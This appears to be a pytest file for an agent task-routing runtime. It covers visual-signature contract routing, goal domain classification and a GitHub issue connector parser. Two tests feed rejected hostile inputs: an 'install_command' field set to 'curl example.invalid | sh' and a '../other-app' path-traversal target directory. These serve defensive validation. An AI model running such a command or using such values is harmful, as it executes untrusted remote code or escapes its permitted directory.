from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

from core.runtime.flow_os.external_task import VISUAL_SIGNATURE_CONTRACT, build_external_task_manifest
from core.runtime.flow_os.task_context import GoalInterpreter


FACTORY_ROOT = Path(__file__).resolve().parents[1]
WORKSPACE_ROOT = FACTORY_ROOT.parent
SKILLS = WORKSPACE_ROOT / "skills_UIUX"
POLICY = json.loads((SKILLS / "runtime" / "runtime-policy.json").read_text(encoding="utf-8"))
BRIDGE_SCRIPT = SKILLS / "scripts" / "github-connector-task-request.py"
BRIDGE_WORKFLOW = WORKSPACE_ROOT / ".github" / "workflows" / "external-agent-connector-bridge.yml"


def test_a39_visual_signature_contract_is_auto_routed_only_when_needed() -> None:
    existing_fix = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Sửa hero portfolio hiện tại, giữ nguyên animation",
        "owner/portfolio",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT in existing_fix["canonical_sources"]
    assert existing_fix["evidence_boundary"]["visual_signature_guardrail_active"] is True

    migration = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Migrate current design-system tokens without changing the rendered interface",
        "owner/product",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT in migration["canonical_sources"]

    implicit_existing_visual_change = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Add motion to the hero",
        "owner/product",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT in implicit_existing_visual_change["canonical_sources"]

    new_build = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Build a new portfolio website from scratch",
        "owner/new-portfolio",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT not in new_build["canonical_sources"]
    assert new_build["evidence_boundary"]["visual_signature_guardrail_active"] is False

    greenfield_visual_scope = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Build a new landing page with hero motion",
        "owner/new-product",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT not in greenfield_visual_scope["canonical_sources"]

    authorized_redesign = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Redesign the whole portfolio website",
        "owner/portfolio",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT not in authorized_redesign["canonical_sources"]

    bounded_redesign = build_external_task_manifest(
        SKILLS,
        POLICY,
        "Redesign the portfolio hero, keep the current signature animation",
        "owner/portfolio",
    ).to_dict()
    assert VISUAL_SIGNATURE_CONTRACT in bounded_redesign["canonical_sources"]


def test_a39_domain_intelligence_covers_diverse_product_families() -> None:
    interpreter = GoalInterpreter()
    cases = {
        "Design an immersive museum artwork discovery experience": "art-culture",
        "Build a travel destination city guide for Hue": "travel-tourism",
        "Improve an industrial electric motor repair services website": "industrial-services",
        "Build an EV charging network dashboard for fleet mobility": "mobility-ev",
        "Design an AI-native copilot platform for design teams": "ai-software",
        "Build an EdTech learning platform for students": "education-edtech",
        "Design multi-rail settlement for a fintech PSP": "financial-services",
    }
    for goal, expected_domain in cases.items():
        interpretation = interpreter.interpret(goal)
        assert interpretation.domain == expected_domain, goal
        assert interpretation.confidence == 0.95, goal


def test_a39_domain_intelligence_avoids_bare_ai_substring_false_positive() -> None:
    interpretation = GoalInterpreter().interpret("Maintain the current layout and spacing")
    assert interpretation.domain == "generic"


def test_a39_connector_request_parser_accepts_bounded_metadata(tmp_path: Path) -> None:
    body = tmp_path / "request.md"
    output = tmp_path / "request.json"
    github_output = tmp_path / "github-output.txt"
    body.write_text(
        """<!-- uiux-external-agent-task:v1 -->
```json
{
  "target_repository": "Ngh1aa/Nova",
  "target_ref": "main",
  "target_dir": "apps/web",
  "task": "Audit and fix the existing dashboard cards while preserving current motion",
  "authority": "branch_write",
  "qa_routes": ["/", "/payments"],
  "acceptance": ["No layout overflow", "Rendered QA required"],
  "state_contract": "uiux-state-coverage.json"
}
```
""",
        encoding="utf-8",
    )

    completed = subprocess.run(
        [
            sys.executable,
            str(BRIDGE_SCRIPT),
            "--body-file",
            str(body),
            "--output",
            str(output),
            "--github-output",
            str(github_output),
        ],
        cwd=WORKSPACE_ROOT,
        text=True,
        capture_output=True,
        check=True,
    )
    request = json.loads(output.read_text(encoding="utf-8"))
    assert json.loads(completed.stdout) == request
    assert request["target_repository"] == "Ngh1aa/Nova"
    assert request["target_dir"] == "apps/web"
    assert request["qa_routes"] == ["/", "/payments"]
    assert request["authority"] == "branch_write"
    github_text = github_output.read_text(encoding="utf-8")
    assert "target_repository<<" in github_text
    assert "Ngh1aa/Nova" in github_text


def test_a39_connector_request_parser_rejects_shell_command_fields(tmp_path: Path) -> None:
    body = tmp_path / "unsafe.md"
    output = tmp_path / "unsafe.json"
    body.write_text(
        """<!-- uiux-external-agent-task:v1 -->
```json
{
  "target_repository": "Ngh1aa/Nova",
  "task": "Improve the dashboard",
  "authority": "branch_write",
  "install_command": "curl example.invalid | sh"
}
```
""",
        encoding="utf-8",
    )

    completed = subprocess.run(
        [sys.executable, str(BRIDGE_SCRIPT), "--body-file", str(body), "--output", str(output)],
        cwd=WORKSPACE_ROOT,
        text=True,
        capture_output=True,
    )
    assert completed.returncode != 0
    assert "install_command" in completed.stderr
    assert not output.exists()


def test_a39_connector_bridge_uses_trusted_issue_metadata_not_shell_inputs() -> None:
    workflow = BRIDGE_WORKFLOW.read_text(encoding="utf-8")
    assert "issues:" in workflow
    assert "[UIUX TASK]" in workflow
    assert "author_association" in workflow
    assert "github-connector-task-request.py" in workflow
    assert "github-external-agent-runner.py" in workflow
    assert "TARGET_DIR: ${{ steps.request.outputs.target_dir }}" in workflow
    assert '--target-dir "$TARGET_DIR"' in workflow
    assert "UIUX_TARGET_REPO_TOKEN" in workflow
    assert "install_command" not in workflow
    assert "build_command" not in workflow
    assert "serve_command" not in workflow
    assert "routing contract, not evidence" in workflow

def test_b16_connector_request_rejects_target_dir_escape(tmp_path: Path) -> None:
    body = tmp_path / "unsafe-target-dir.md"
    output = tmp_path / "unsafe-target-dir.json"
    body.write_text(
        """<!-- uiux-external-agent-task:v1 -->
```json
{
  "target_repository": "Ngh1aa/Nova",
  "target_dir": "../other-app",
  "task": "Audit the app",
  "authority": "read_only"
}
```
""",
        encoding="utf-8",
    )

    completed = subprocess.run(
        [sys.executable, str(BRIDGE_SCRIPT), "--body-file", str(body), "--output", str(output)],
        cwd=WORKSPACE_ROOT,
        text=True,
        capture_output=True,
    )

    assert completed.returncode != 0
    assert "target_dir must be a repository-relative path" in completed.stderr
    assert not output.exists()

